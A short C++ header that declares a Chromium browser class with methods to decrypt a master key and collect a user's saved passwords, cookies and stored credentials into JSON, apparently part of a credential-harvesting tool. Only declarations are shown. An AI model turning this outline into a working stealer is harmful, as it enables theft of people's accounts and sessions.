#pragma once

#include <iostream>
#include "Browser.h"
#include "ChromiumDecrypt.h"

namespace Tool
{
	namespace Browsers
	{
		class Chromium : public Browser{
		public:
			Chromium(Tool::Configuration::config_t MainContext_t);
			std::string sMasterKey;
			void GetUserPasswords(awesomejson::json& jFinalCredentials) override;
			void GetUserCookies(awesomejson::json& jChromeCookies) override;
			void ExecuteAllModules(awesomejson::json& jFinalResults, Tool::Browsers::Browser& BrowserType) override;
			bool GatherCredentialsFromDB();
		};
	}
}